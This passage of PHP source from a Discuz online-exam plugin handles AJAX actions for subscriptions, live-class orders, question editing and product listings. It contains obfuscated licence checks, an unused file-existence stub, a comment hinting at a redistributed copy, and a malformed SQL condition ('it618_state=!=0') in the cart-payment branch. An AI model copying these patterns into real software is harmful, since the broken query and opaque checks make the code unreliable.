			echo 'it618_splitdelit618_split';
		}else{
			
			$id = C::t('#it618_exam#it618_exam_shop_subscribe')->insert(array(
				'it618_shopid' => $_GET['shopid'],
				'it618_uid' => $uid,
				'it618_time' => $_G['timestamp']
			), true);
			
			echo 'it618_splitokit618_split';
		}
	}
	exit;
}


if($_GET['ac']=="liveorder"){	
	if($uid<=0){
		echo it618_exam_getlang('s485');
	}else{
		if($it618_exam_live_order=C::t('#it618_exam#it618_exam_live_order')->fetch_by_liveid_uid($_GET['liveid'],$uid)){
			C::t('#it618_exam#it618_exam_live_order')->delete_by_id($it618_exam_live_order['id']);

			echo 'it618_splitokit618_split';
		}else{
			if($_GET['istel']!=1){
				
				if($it618_members_wxuser=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_wxuser')." WHERE it618_uid=".$uid)){
					
					if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php')){
						require DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php';
					}
					
					require_once DISCUZ_ROOT.'./source/plugin/it618_members/sms/sms_wx/WxSms.php';
					
					$openid=$it618_members_wxuser['it618_wxopenid'];
					$appid=trim($wxjk_appid);
					$appsecret=trim($wxjk_appsecret);
					
					$data=get_wxsubscribe($appid,$appsecret,$openid,DISCUZ_ROOT);
					$subscribe=$data['subscribe'];
					
					if($subscribe==0){
						echo $it618_exam_lang['s1392'];exit;
					}
				}else{
					echo $it618_exam_lang['s1391'];exit;
				}
			}
			
			$id = C::t('#it618_exam#it618_exam_live_order')->insert(array(
				'it618_liveid' => $_GET['liveid'],
				'it618_uid' => $uid,
				'it618_tel' => it618_exam_utftogbk($_GET['it618_tel']),
				'it618_time' => $_G['timestamp']
			), true);
			
			echo 'it618_splitokit618_split';
		}
	}
	exit;
}


if($_GET['ac']=="note_save"){
	if($uid<=0){
		echo it618_exam_getlang('s485');
	}else{
		if($it618_exam_test_pj=C::t('#it618_exam#it618_exam_test_pj')->fetch_by_pid_uid($_GET['pid'],$uid)){
			C::t('#it618_exam#it618_exam_test_pj')->update($it618_exam_test_pj['id'],array(
				'it618_notecontent' => it618_exam_utftogbk($_GET['notecontent'])
			), true);

			echo it618_exam_getlang('t756');
		}else{
			echo it618_exam_getlang('s513');
		}
	}
	exit;
}


if($_GET['ac']=="saveadderrset"){
	if($uid<=0){
		echo it618_exam_getlang('s485');
	}else{
		if($it618_exam_user=C::t('#it618_exam#it618_exam_user')->fetch_by_uid($uid)){
			C::t('#it618_exam#it618_exam_user')->update($it618_exam_user['id'],array(
				'it618_isadderr' => $_GET['isadderr']
			), true);
		}else{
			C::t('#it618_exam#it618_exam_user')->insert(array(
				'it618_uid' => $uid,
				'it618_isadderr' => $_GET['isadderr']
			), true);
		}
	}
	exit;
}


if($_GET['ac']=="payok"){
	
	if($_GET['ac1']=="pay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_exam_sale')." WHERE it618_state!=0 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="gwcpay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_exam_gwcsale_main')." WHERE it618_state=!=0 and id=".intval($_GET['saleid']));
	}
	
	if($salecount>0){
		echo 'it618_splitok';exit;
	}
}


if($_GET['ac']=="tx_add"||$_GET['ac']=="tx_del"||$_GET['ac']=="tx_get"||$_GET['ac']=="gwclist_editprice"||$_GET['ac']=="save_editprice"||$_GET['ac']=="state_editprice"||$_GET['ac']=="sale_get"||$_GET['ac']=="sale_dao"||$_GET['ac']=="test_get"||$_GET['ac']=="play_dao"||$_GET['ac']=="questions_get"||$_GET['ac']=="question_del"||$_GET['ac']=="questions_del"||$_GET['ac']=="question_lid"||$_GET['ac']=="delquestion_lid"||$_GET['ac']=="questions_lid"||$_GET['ac']=="delquestions_lid"||$_GET['ac']=="questions_saveclass"||$_GET['ac']=="shopgoods_get"||$_GET['ac']=="shopsubscribe_get"){
	if(!($_GET['ac']=="getmediacode"||$_GET['ac']=="addmedia"||$_GET['ac']=="addmediaaudio")){
		if($_GET['formhash']!=FORMHASH)exit; /*DISM - TAOBAO - COM */
	}
	
	if($uid<=0){
		echo it618_exam_getlang('s485');exit;
	}else{
		if(C::t('#it618_exam#it618_exam_shop')->count_by_it618_uid($uid)>0){
			$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_uid($uid);
				
			$it618_state=$it618_exam_shop['it618_state'];
			if($it618_state==0){
				echo it618_exam_getlang('s334');exit;
			}elseif($it618_state==1){
				echo it618_exam_getlang('s335');exit;
			}else{
				$it618_htstate=$it618_exam_shop['it618_htstate'];
				if($it618_htstate==0){
					echo it618_exam_getlang('s336');exit;
				}elseif($it618_htstate==2){
					echo it618_exam_getlang('s337');exit;
				}else{
					$ShopId=$it618_exam_shop['id'];
					$ShopUId=$it618_exam_shop['it618_uid'];
					$ShopName=$it618_exam_shop['it618_name'];
					$ShopIsCheck=$it618_exam_shop['it618_ischeck'];
					$ShopIsCheckAudio=$it618_exam_shop['it618_ischeck_audio'];
					$ShopTCBL=$it618_exam_shop['it618_tcbl'];
				}
			}
			
		}else{
			echo it618_exam_getlang('s524');exit;
		}
	}

}


if($_GET['ac']=="shopsubscribe_get"){
	if($_GET['ac1']=='pcshopsubscribe')$ppp = 12;
	if($_GET['ac1']=='wapshopsubscribe')$ppp = 15;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_shop_subscribe')->count_by_search($ShopId,'','it618_time desc',$_GET['finduid']);
	
	$funname='getshopsubscribelist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_shop_subscribe')->fetch_all_by_search($ShopId,'','it618_time desc',$_GET['finduid'],$startlimit,$ppp) as $it618_exam_shop_subscribe) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$u_avatarimg=it618_exam_discuz_uc_avatar($it618_exam_shop_subscribe['it618_uid'],'middle');

		if($_GET['ac1']=='pcshopsubscribe'){
			
			$subscribe_get.='<tr class="hover">
						<td><a href="'.it618_exam_rewriteurl($it618_exam_shop_subscribe['it618_uid']).'" target="_blank"><img src="'.$u_avatarimg.'" width=36 style="vertical-align:middle"></a> <a href="'.it618_exam_rewriteurl($it618_exam_shop_subscribe['it618_uid']).'" target="_blank">'.it618_exam_getusername($it618_exam_shop_subscribe['it618_uid']).'('.$it618_exam_shop_subscribe['it618_uid'].')</a></td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_shop_subscribe['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapshopsubscribe'){
			$subscribe_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="80" style="vertical-align:top;border:none">
							<img class="lazy" data-original="'.$u_avatarimg.'" style="border-radius: 3px;" width="70" height="70"/>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							'.it618_exam_getusername($it618_exam_shop_subscribe['it618_uid']).'('.$it618_exam_shop_subscribe['it618_uid'].')<br>
							'.$wxstr.'<br>'.$telstr.'<br>
							<font color=#999><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_shop_subscribe['it618_time']).'</font></font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcshopsubscribe'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s1405')."<font color=red>$count</font>"."it618_split".$subscribe_get."it618_split".$multipage;
}


if($_GET['ac']=="getshopgoods"){
	echo it618_exam_getshopgoods($_GET['shopid'],$_GET['page'],$_GET['wap']);
}



if($_GET['ac']=="question_del"){
	if($it618_exam_questions=C::t('#it618_exam#it618_exam_questions')->fetch_by_id($_GET['qid'])){
		if($it618_exam_questions['it618_shopid']!=$ShopId){
			echo $it618_exam_lang['s1211'];exit;
		}else{
			$goodscount=C::t('#it618_exam#it618_exam_goods_questions')->count_by_qid($it618_exam_questions['id']);
			if($goodscount>0){
				echo $it618_exam_lang['s1212'];exit;
			}else{
				DB::query("delete FROM ".DB::table('it618_exam_questions_option')." WHERE it618_qid=".$it618_exam_questions['id']);
				C::t('#it618_exam#it618_exam_questions')->delete_by_id($it618_exam_questions['id']);
				echo 'it618_splitokit618_split'.$it618_exam_lang['s1213'];exit;
			}
		}
	}else{
		echo $it618_exam_lang['s1210'];exit;
	}
}


if($_GET['ac']=="questions_del"){
	$qids=$_GET['qids'];
	$qidarr=explode("@",$qids);
	$ok=0;
	for($i=0;$i<count($qidarr);$i++){
		$qid=intval($qidarr[$i]);
		if($qid>0){
			if($it618_exam_questions=C::t('#it618_exam#it618_exam_questions')->fetch_by_id($qid)){
				if($it618_exam_questions['it618_shopid']!=$ShopId){
					echo $it618_exam_lang['s1211'];exit;
				}else{
					$goodscount=C::t('#it618_exam#it618_exam_goods_questions')->count_by_qid($it618_exam_questions['id']);
					if($goodscount==0){
						DB::query("delete FROM ".DB::table('it618_exam_questions_option')." WHERE it618_qid=".$it618_exam_questions['id']);
						C::t('#it618_exam#it618_exam_questions')->delete_by_id($it618_exam_questions['id']);
						$ok=$ok+1;
					}
				}
			}else{
				echo $it618_exam_lang['s1210'];exit;
			}
		}
	}
	
	echo 'it618_splitokit618_split'.$it618_exam_lang['s733'].$ok;exit;
}


if($_GET['ac']=="questions_lid"){
	$qids=$_GET['qids'];
	$qidarr=explode("@",$qids);
	$ok=0;
	for($i=0;$i<count($qidarr);$i++){
		$qid=intval($qidarr[$i]);
		if($qid>0){
			$tmpstr=it618_exam_lidquestion($_GET['lid'],$qid,$ShopId);
			$tmparr=explode("it618_split",$tmpstr);
			if(count($tmparr)==1){
				echo $tmpstr;exit;
			}
		}
	}
	
	echo 'it618_splitokit618_split';exit;
}


if($_GET['ac']=="question_lid"){
	echo it618_exam_lidquestion($_GET['lid'],$_GET['qid'],$ShopId);
}


if($_GET['ac']=="delquestions_lid"){
	$qids=$_GET['qids'];
	$qidarr=explode("@",$qids);
	$ok=0;
	for($i=0;$i<count($qidarr);$i++){
		$qid=intval($qidarr[$i]);
		if($qid>0){
			$tmpstr=it618_exam_liddelquestion($_GET['lid'],$qid,$ShopId);
			$tmparr=explode("it618_split",$tmpstr);
			if(count($tmparr)==1){
				echo $tmpstr;exit;
			}
		}
	}
	
	echo 'it618_splitokit618_split';exit;
}


if($_GET['ac']=="delquestion_lid"){
	echo it618_exam_liddelquestion($_GET['lid'],$_GET['qid'],$ShopId);
}


if($_GET['ac']=="questions_saveclass"){
	$qids=$_GET['qids'];
	$qidarr=explode("@",$qids);
	$ok=0;
	for($i=0;$i<count($qidarr);$i++){
		$qid=intval($qidarr[$i]);
		if($qid>0){
			if($it618_exam_questions=C::t('#it618_exam#it618_exam_questions')->fetch_by_id($qid)){
				if($it618_exam_questions['it618_shopid']!=$ShopId){
					echo $it618_exam_lang['s1211'];exit;
				}else{
					if($_GET['type']==0){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_class1_id' => $_GET['it618_class1_id'],
							'it618_class2_id' => $_GET['it618_class2_id'],
							'it618_qclass11_id' => $_GET['it618_qclass11_id'],
							'it618_qclass12_id' => $_GET['it618_qclass12_id'],
							'it618_qclass13_id' => $_GET['it618_qclass13_id'],
							'it618_qclass21_id' => $_GET['it618_qclass21_id'],
							'it618_qclass22_id' => $_GET['it618_qclass22_id'],
							'it618_qclass23_id' => $_GET['it618_qclass23_id'],
							'it618_qclass24_id' => $_GET['it618_qclass24_id'],
							'it618_qclass25_id' => $_GET['it618_qclass25_id'],
							'it618_qclass26_id' => $_GET['it618_qclass26_id'],
							'it618_qclass3_id' => $_GET['it618_qclass3_id'],
							'it618_qclass4_id' => $_GET['it618_qclass4_id']
						));
					}
					if($_GET['type']==1){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_class1_id' => $_GET['it618_class1_id'],
							'it618_class2_id' => $_GET['it618_class2_id'],
							'it618_qclass11_id' => $_GET['it618_qclass11_id'],
							'it618_qclass12_id' => $_GET['it618_qclass12_id'],
							'it618_qclass13_id' => $_GET['it618_qclass13_id']
						));
					}
					if($_GET['type']==2){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_qclass21_id' => $_GET['it618_qclass21_id'],
							'it618_qclass22_id' => $_GET['it618_qclass22_id'],
							'it618_qclass23_id' => $_GET['it618_qclass23_id'],
							'it618_qclass24_id' => $_GET['it618_qclass24_id'],
							'it618_qclass25_id' => $_GET['it618_qclass25_id'],
							'it618_qclass26_id' => $_GET['it618_qclass26_id']
						));
					}
					if($_GET['type']==13){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_class3_id' => $_GET['it618_class3_id']
						));
					}
					if($_GET['type']==14){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_class4_id' => $_GET['it618_class4_id']
						));
					}
					if($_GET['type']==3){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_qclass3_id' => $_GET['it618_qclass3_id']
						));
					}
					if($_GET['type']==4){
						C::t('#it618_exam#it618_exam_questions')->update($qid,array(
							'it618_qclass4_id' => $_GET['it618_qclass4_id']
						));
					}
				}
			}else{
				echo $it618_exam_lang['s1210'];exit;
			}
		}
	}
	
	echo 'it618_splitokit618_split';exit;
}


if($_GET['ac']=="questions_get"){
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$ppp = intval($_GET['pageppp']);
	if($ppp==0)$ppp=10;
	
	if($_GET['it618_isoption']==1){
		$sql='it618_optioncount=0';
	}
	
	$count = C::t('#it618_exam#it618_exam_questions')->count_by_search($sql, '', $ShopId, $_GET['it618_class1_id'], $_GET['it618_class2_id'], $_GET['it618_class3_id'], $_GET['it618_class4_id'], $_GET['it618_qclass11_id'], $_GET['it618_qclass12_id'], $_GET['it618_qclass13_id'], $_GET['it618_qclass21_id'], $_GET['it618_qclass22_id'], $_GET['it618_qclass23_id'], $_GET['it618_qclass24_id'], $_GET['it618_qclass25_id'], $_GET['it618_qclass26_id'], $_GET['it618_qclass3_id'], $_GET['it618_qclass4_id'], $_GET['it618_qtypeid'], it618_exam_utftogbk($_GET['it618_name']));
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$multipage = multi($count, $ppp, $page, "plugin.php?id=it618_exam:sc_question");
	
	$questionsum= '<td colspan=15>'.it618_exam_getlang('s1183').'<font color=red>'.$count.'</font> <span style="float:right;color:#999">'.it618_exam_getlang('s1184').'</span></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getquestions(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getquestions(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getquestions(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	$lid=intval($_GET['lid']);
			
	foreach(C::t('#it618_exam#it618_exam_questions')->fetch_all_by_search(
		$sql, 'id desc', $ShopId, $_GET['it618_class1_id'], $_GET['it618_class2_id'], $_GET['it618_class3_id'], $_GET['it618_class4_id'], $_GET['it618_qclass11_id'], $_GET['it618_qclass12_id'], $_GET['it618_qclass13_id'], $_GET['it618_qclass21_id'], $_GET['it618_qclass22_id'], $_GET['it618_qclass23_id'], $_GET['it618_qclass24_id'], $_GET['it618_qclass25_id'], $_GET['it618_qclass26_id'], $_GET['it618_qclass3_id'], $_GET['it618_qclass4_id'], $_GET['it618_qtypeid'], it618_exam_utftogbk($_GET['it618_name']),$startlimit,$ppp
	) as $it618_exam_questions) {
		
		$qclass1_nametmp='';$qclass1_name='';$qclass2_nametmp='';$qclass2_name='';$class3_name='';$class4_name='';$qclass3_name='';$qclass4_name='';
		
		if($it618_exam_questions['it618_class1_id']>0){
			$qclass1_nametmp=C::t('#it618_exam#it618_exam_class1')->fetch_it618_name_by_id($it618_exam_questions['it618_class1_id']);
			$qclass1_name=$qclass1_nametmp;
		}
		
		if($it618_exam_questions['it618_class2_id']>0){
			$qclass1_nametmp=C::t('#it618_exam#it618_exam_class2')->fetch_it618_name_by_id($it618_exam_questions['it618_class2_id']);
			$qclass1_name=$qclass1_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass11_id']>0){
			$qclass1_nametmp=C::t('#it618_exam#it618_exam_qclass1')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass11_id']);
			$qclass1_name=$qclass1_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass12_id']>0){
			$qclass1_nametmp=C::t('#it618_exam#it618_exam_qclass1')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass12_id']);
			$qclass1_name.=' - '.$qclass1_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass13_id']>0){
			$qclass1_nametmp=C::t('#it618_exam#it618_exam_qclass1')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass13_id']);
			$qclass1_name.=' - '.$qclass1_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass21_id']>0){
			$qclass2_nametmp=C::t('#it618_exam#it618_exam_qclass2')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass21_id']);
			$qclass2_name=$qclass2_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass22_id']>0){
			$qclass2_nametmp=C::t('#it618_exam#it618_exam_qclass2')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass22_id']);
			$qclass2_name.=' - '.$qclass2_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass23_id']>0){
			$qclass2_nametmp=C::t('#it618_exam#it618_exam_qclass2')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass23_id']);
			$qclass2_name.=' - '.$qclass2_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass24_id']>0){
			$qclass2_nametmp=C::t('#it618_exam#it618_exam_qclass2')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass24_id']);
			$qclass2_name.=' - '.$qclass2_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass25_id']>0){
			$qclass2_nametmp=C::t('#it618_exam#it618_exam_qclass2')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass25_id']);
			$qclass2_name.=' - '.$qclass2_nametmp;
		}
		
		if($it618_exam_questions['it618_qclass26_id']>0){
			$qclass2_nametmp=C::t('#it618_exam#it618_exam_qclass2')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass26_id']);
			$qclass2_name.=' - '.$qclass2_nametmp;
		}
		
		if($it618_exam_questions['it618_class3_id']>0){
			$class3_name=C::t('#it618_exam#it618_exam_class3')->fetch_it618_name_by_id($it618_exam_questions['it618_class3_id']);
		}
		
		if($it618_exam_questions['it618_class4_id']>0){
			$class4_name=C::t('#it618_exam#it618_exam_class4')->fetch_it618_name_by_id($it618_exam_questions['it618_class4_id']);
		}
		
		$qclass3_name=C::t('#it618_exam#it618_exam_qclass3')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass3_id']);
		$qclass4_name=C::t('#it618_exam#it618_exam_qclass4')->fetch_it618_name_by_id($it618_exam_questions['it618_qclass4_id']);
		$qtypename=C::t('#it618_exam#it618_exam_qtype')->fetch_it618_name_by_id($it618_exam_questions['it618_qtypeid']);
		
		$goodscount=C::t('#it618_exam#it618_exam_goods_questions')->count_by_qid($it618_exam_questions['id']);
		
		$delqstr='';
		if($goodscount==0){
			$delqstr='<a href="javascript:" onclick="delquestion('.$it618_exam_questions['id'].')">'.$it618_exam_lang['s1192'].'</a>';
		}
		
		$lidqstr='';$testcount=0;
		$opcount = $it618_exam_questions['it618_optioncount'];
		if($lid>0){
			$it618_exam_goods_lesson = C::t('#it618_exam#it618_exam_goods_lesson')->fetch_by_id($lid);
			if(C::t('#it618_exam#it618_exam_goods_questions')->count_by_pid_qid($it618_exam_goods_lesson['it618_pid'],$it618_exam_questions['id'])==0){
				if($opcount>0||$it618_exam_questions['it618_qtypeid']>3)$lidqstr='<a href="javascript:" onclick="lidquestion('.$lid.','.$it618_exam_questions['id'].')">'.$it618_exam_lang['s1091'].'</a>';
			}else{
				$testcount=C::t('#it618_exam#it618_exam_test_exam_questions')->count_by_pid_qid($it618_exam_goods_lesson['it618_pid'],$it618_exam_questions['id']);
				
				if($testcount>0){
					$lidqstr='<font color=#390>'.$it618_exam_lang['s1356'].'</font>';
				}else{
					$lidqstr='<a href="javascript:" onclick="dellidquestion('.$lid.','.$it618_exam_questions['id'].')"><font color=#666>'.$it618_exam_lang['s566'].'</font></a>';
				}
			}
		}else{
			$testcount=C::t('#it618_exam#it618_exam_test_exam_questions')->count_by_qid($it618_exam_questions['id']);	
		}
		if($testcount=='')$testcount=0;
		
		$opstr='';
		if($opcount==0&&($it618_exam_questions['it618_qtypeid']<=3)){
			$opstr=' <font color=red>'.$it618_exam_lang['s412'].'</font>';
		}

		$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
		$qids.=$it618_exam_questions['id'].',';
		$question_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_q'.$it618_exam_questions['id'].'" value="'.$it618_exam_questions['id'].'"><label for="chk_q'.$it618_exam_questions[id].'">['.$qtypename.'] '.it618_exam_getsmsstr(it618_exam_strip_tags($it618_exam_questions['it618_name'],'<sub> <sup>'),68).$opstr.'</label></td>
		<td width="150" style="color:#999">'.$qclass3_name.' '.$qclass4_name.' '.$class3_name.' '.$class4_name.'</td>
		<td width="150" style="color:#999"><span title="'.$qclass1_name.'">'.$qclass1_nametmp.'</span> <span title="'.$qclass2_name.'">'.$qclass2_nametmp.'</span></td>
		<td width="80">'.$goodscount.'/'.$testcount.'</td>
		<td width="98"><a href="javascript:" onclick="editquestion('.$it618_exam_questions['id'].')">'.$it618_exam_lang['s1191'].'</a> '.$delqstr.' '.$lidqstr.'</td>
		</tr>';
	}

	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><input type=hidden value='.$qids.' id="qids" /></td>';
	
	echo $questionsum.'it618_split'.$question_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="home_goods"){
	$home_goods=C::t('#it618_exam#it618_exam_set')->getsetvalue_by_setname($_GET['ac1']);
	
	$tmparr=explode(",",$home_goods);
	if($_GET['wap']!=1){
		if(count($tmparr)>2){
			$goods_count=$tmparr[0];
		}else{
			$goods_count=15;
		}
	}else{
		if(count($tmparr)>2){
			$goods_count=$tmparr[1];
		}else{
			$goods_count=8;
		}
	}
	
	if($_GET['ac1']=='zjsalegoods'){	
		
		if($IsPinEdu==1){
			$query = DB::query("SELECT p.it618_pid FROM ".DB::table('it618_pinedu_goods')." p left join ".DB::table('it618_exam_goods')." g on p.it618_pid=g.id and p.it618_shoptype='exam' and UNIX_TIMESTAMP(it618_time2)>".$_G['timestamp']." left join ".DB::table('it618_exam_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 and p.it618_shoptype='exam' GROUP BY p.it618_pid ORDER BY g.it618_tests desc limit 0,".$goods_count);
		}else{
			$query = DB::query("SELECT max(m.id) as maxid,m.it618_pid FROM ".DB::table('it618_exam_sale')." m left join ".DB::table('it618_exam_goods')." g on m.it618_pid=g.id and m.it618_state>0 left join ".DB::table('it618_exam_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and g.it618_gtype=1 and b.it618_state=2 and b.it618_htstate=1 and m.it618_pid>0 GROUP BY m.it618_pid ORDER BY maxid desc limit 0,".$goods_count);
		}
	}
	
	if($_GET['ac1']=='weeksalegoods'){
		$query = DB::query("SELECT id as it618_pid from ".DB::table('it618_exam_goods')." where it618_xgtype>0 and UNIX_TIMESTAMP(it618_xgtime2)>".$_G['timestamp']." order by it618_xgtime2 limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='newgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_exam_goods')." g left join ".DB::table('it618_exam_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and g.it618_gtype=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.id desc limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='hotgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_exam_goods')." g left join ".DB::table('it618_exam_shop')." b on g.it618_shopid=b.id where g.it618_state=1  and g.it618_gtype=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.it618_views desc limit 0,".$goods_count);
	}
	
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';
		
	}
	
	if($_GET['wap']!=1){
		$i=1;
		$home_goodstmp='';
		while($it618_homegoods = DB::fetch($query)) {
			$it618_exam_goods=C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_homegoods['it618_pid']);
			
			if(!it618_exam_issecretok($it618_exam_goods)){
				continue;
			}
		
			if($it618_exam_goods['it618_state']==1){
				if($templatename=='default'){
					if($i%5==1)$home_goodstmp.='<li class="swiper-slide">';
					
					$it618_exam_shop = DB::fetch_first("SELECT * FROM ".DB::table('it618_exam_shop')." WHERE id=".$it618_exam_goods['it618_shopid']);
				
					if($it618_exam_goods['it618_saleprice']>0||$it618_exam_goods['it618_score']>0){
						$pricestr='<span class="price">'.it618_exam_getgoodsprice($it618_exam_goods,'goods_price').'</span>';
					}else{
						$pricestr='<span style="color:#390;">'.$it618_exam_lang['s106'].'</span>';
					}
					
					$it618_isvip='';
					$vipgroupids=it618_exam_getgoodsvipgroupids($it618_exam_goods);
					if(count($vipgroupids)>0){
						$it618_isvip='<img src="source/plugin/it618_exam/images/vip.png" style="vertical-align:middle;margin-top:-3px;margin-right:3px">';
					}
					
					if($_GET['ac1']=='zjsalegoods'){
						if($IsPinEdu==1){
							if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('exam',$it618_exam_goods['id'])){
								if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('exam',$it618_exam_goods['id'])){
								}
							}
							$it618_pinedu_goods['it618_saleprice']=$it618_pinedu_goods['it618_price'];
							$pricestr='<img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:20px; margin-right:6px;margin-top:1px;float:left"><span class="price">'.it618_exam_getgoodsprice($it618_pinedu_goods,'goods_price').'</span>';
							$it618_isvip='';
						}
					}
					
					$jfbl='';
					if($it618_exam_goods['it618_jfbl']>0&&$it618_exam_goods['it618_saleprice']>0){
